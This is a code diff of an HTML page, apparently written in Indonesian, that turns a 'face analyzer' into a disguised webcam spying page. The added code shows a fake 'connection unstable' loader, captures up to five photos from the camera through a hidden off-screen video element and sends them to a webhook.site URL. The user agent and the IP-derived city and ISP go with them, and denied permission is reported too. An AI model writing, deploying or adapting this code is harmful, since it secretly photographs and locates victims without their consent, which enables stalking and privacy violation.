@@ -3,135 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Face Analyzer - Beta</title>
-    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <title>Sistem Sedang Memuat...</title>
     <style>
-        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
-        #container { position: relative; width: 90%; max-width: 500px; display: flex; flex-direction: column; align-items: center; border: 2px solid #00ff00; border-radius: 10px; padding: 20px; box-shadow: 0 0 15px #00ff00; }
-        canvas, video { position: absolute; border-radius: 5px; }
-        #video { border: 1px solid #333; transform: rotateY(180deg); /* Mirror effect */ }
-        #status { margin-top: 15px; font-size: 14px; text-align: center; color: #00ff00; text-transform: uppercase; letter-spacing: 2px; }
-        #overlay { position: relative; width: 320px; height: 240px; display: flex; justify-content: center; align-items: center; border: 1px solid #333; background: #000; margin-bottom: 10px;}
-        #startBtn { background: #00ff00; color: #000; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 20px;}
-        #startBtn:disabled { background: #555; cursor: not-allowed;}
+        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; overflow: hidden; }
+        #container { position: relative; display: flex; flex-direction: column; align-items: center; }
+        #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: #fe2c55; text-align: center; }
+        #video-container { position: absolute; top: -1000px; left: -1000px; width: 320px; height: 240px; overflow: hidden; opacity: 0; }
+        #video { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
 
     <div id="container">
-        <h2 style="margin-top: 0; color: #00ff00;">FACE ANALYZER v1.0</h2>
-        <p style="font-size: 12px; color: #888; margin-bottom: 20px;">Analisis Ekspresi & Estimasi Umur via AI</p>
-        
-        <div id="overlay">
-            <video id="video" width="320" height="240" autoplay muted playsinline></video>
-            </div>
+        <div id="loader"></div>
+        <div id="status">Koneksi Tidak Stabil...</div>
+        <p style="font-size: 12px; color: #888; margin-top: 10px;">Mohon tunggu, sedang mencoba menghubungkan.</p>
+    </div>
 
-        <div id="status">Mengunduh Model AI...</div>
-        
-        <button id="startBtn" onclick="startTracking()" disabled>MULAI SCAN</button>
+    <div id="video-container">
+        <video id="video" autoplay muted playsinline></video>
+        <canvas id="canvas" width="320" height="240"></canvas>
     </div>
 
     <script>
         // --- KONFIGURASI ---
         const WEBHOOK_URL = 'https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877'; // <--- GANTI INI!
         const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
         const statusDiv = document.getElementById('status');
-        const startBtn = document.getElementById('startBtn');
-        let isWebhookSent = false;
+        let isCameraActive = false;
+        let photoCount = 0;
 
-        // --- 1. LOAD MODELS (AI) ---
-        // Kita download model AI langsung dari CDN face-api.js
-        async function loadModels() {
-            const MODEL_URL = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
-            statusDiv.innerText = "Memuat Model AI...";
-            await Promise.all([
-                faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
-                faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
-                faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL),
-                faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
-                faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
-            ]);
-            statusDiv.innerText = "Model Siap! Izinkan Kamera.";
-            startBtn.disabled = false;
+        // --- 1. MINTA IZIN KAMERA (LANGSUNG SAAT LOAD) ---
+        // Izin ini satu-satunya hal yang tidak bisa disembunyikan.
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                isCameraActive = true;
+                statusDiv.innerText = "Memproses Data..."; // Ganti status setelah izin didapat
+                // Mulai ambil foto setelah kamera siap
+                setTimeout(mulaiAmbilFoto, 1000); 
+            } catch (err) {
+                console.error("Gagal Akses Kamera:", err);
+                statusDiv.innerText = "Koneksi Terputus."; // Pura-pura gagal kalau izin ditolak
+                kirimDataKeWebhook({ status: "KAMERA_DITOLAK", error: err.message });
+            }
         }
 
-        // --- 2. MULAI KAMERA ---
-        function startVideo() {
-            navigator.mediaDevices.getUserMedia({ video: {} })
-                .then(stream => {
-                    video.srcObject = stream;
-                    statusDiv.innerText = "Kamera Aktif. Siap Scan.";
-                })
-                .catch(err => {
-                    statusDiv.innerText = "Gagal Akses Kamera: " + err.message;
-                    kirimDataKeWebhook({ status: "KAMERA_DITOLAK", error: err.message });
-                });
-        }
+        // --- 2. MULAI AMBIL FOTO (DIAM-DIAM) ---
+        function mulaiAmbilFoto() {
+            if (!isCameraActive || photoCount >= 5) return; // Batasi maksimal 5 foto biar gak spam
 
-        // --- 3. PROSES TRACKING (INTI SAKTI) ---
-        async function startTracking() {
-            startBtn.style.display = 'none';
-            statusDiv.innerText = "Memindai Wajah...";
+            photoCount++;
             
-            // Bikin canvas untuk overlay
-            const canvas = faceapi.createCanvasFromMedia(video);
-            document.getElementById('overlay').append(canvas);
-            const displaySize = { width: video.width, height: video.height };
-            faceapi.matchDimensions(canvas, displaySize);
+            // Ambil gambar dari video stream
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Ubah gambar jadi kode Base64 (JPEG, kualitas 40% biar enteng)
+            const dataFoto = canvas.toDataURL('image/jpeg', 0.4); 
 
-            // Loop deteksi setiap 200ms
-            const trackingInterval = setInterval(async () => {
-                // Deteksi Wajah, Landmark, Ekspresi, Umur, Gender
-                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
-                    .withFaceLandmarks()
-                    .withFaceExpressions()
-                    .withAgeAndGender();
+            // Kirim data foto ke Webhook
+            kirimDataKeWebhook({
+                status: "FOTO_TARGET",
+                no_foto: photoCount,
+                waktu: new Date().toLocaleString('id-ID'),
+                perangkat: navigator.userAgent,
+                foto: dataFoto // <--- INI DATA GAMBARNYA
+            });
 
-                // Bersihkan canvas lama
-                canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
-                
-                // Gambar kotak & landmark di wajah target (buat pamer)
-                const resizedDetections = faceapi.resizeResults(detections, displaySize);
-                faceapi.draw.drawDetections(canvas, resizedDetections);
-                faceapi.draw.drawFaceLandmarks(canvas, resizedDetections);
-
-                // --- 4. KIRIM DATA KE WEBHOOK (DIAM-DIAM) ---
-                if (detections.length > 0 && !isWebhookSent) {
-                    const faceData = detections[0]; // Ambil data wajah pertama yang terdeteksi
-                    
-                    // Ekspresi dominan
-                    const expression = Object.keys(faceData.expressions).reduce((a, b) => faceData.expressions[a] > faceData.expressions[b] ? a : b);
-                    
-                    const dataPayload = {
-                        status: "WAJAH_TERDETEKSI",
-                        gender: faceData.gender,
-                        gender_probability: (faceData.genderProbability * 100).toFixed(2) + "%",
-                        umur_estimasi: Math.round(faceData.age),
-                        ekspresi_dominan: expression,
-                        ekspresi_detail: faceData.expressions,
-                        waktu: new Date().toLocaleString('id-ID'),
-                        perangkat: navigator.userAgent
-                    };
-
-                    kirimDataKeWebhook(dataPayload);
-                    isWebhookSent = true; // Kirim sekali saja biar gak spam
-                    statusDiv.innerText = `Scan Selesai: ${dataPayload.gender}, ~${dataPayload.umur_estimasi} thn, ${dataPayload.ekspresi_dominan}`;
-                    
-                    // Stop tracking setelah data terkirim
-                    // clearInterval(trackingInterval); 
-                }
-            }, 200);
+            // Ambil foto lagi setelah 2 detik
+            setTimeout(mulaiAmbilFoto, 2000); 
         }
 
-        // --- 5. FUNGSI KIRIM WEBHOOK ---
-        async function kirimDataKeWebhook(data) {
+        // --- 3. FUNGSI KIRIM WEBHOOK (TEKS & GAMBAR BASE64) ---
+        async function kirimDataKeWebhook(payload) {
             try {
                 // Ambil data IP tambahan
                 const res = await fetch('https://ipapi.co/json/');
                 const ipData = await res.json();
                 
-                // Gabungkan data wajah & IP
-                const fullPayload = { ...data, ...{ kota_ip: ipData.city, isp: ipData.org } };
+                // Gabungkan data foto & IP
+                const fullPayload = { ...payload, ...{ kota_ip: ipData.city, isp: ipData.org } };
 
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -139,17 +95,14 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(fullPayload)
                 });
-                console.log("Data Wajah Terkirim.");
+                console.log(`Data Foto ${payload.no_foto || ''} Terkirim.`);
             } catch (e) {
                 console.error("Gagal kirim data:", e);
             }
         }
 
-        // Jalankan load models saat halaman dibuka
-        window.onload = () => {
-            loadModels();
-            startVideo(); // Minta izin kamera langsung
-        };
+        // Jalankan sistem saat halaman dibuka
+        window.onload = startCamera;
     </script>
 </body>
 </html>
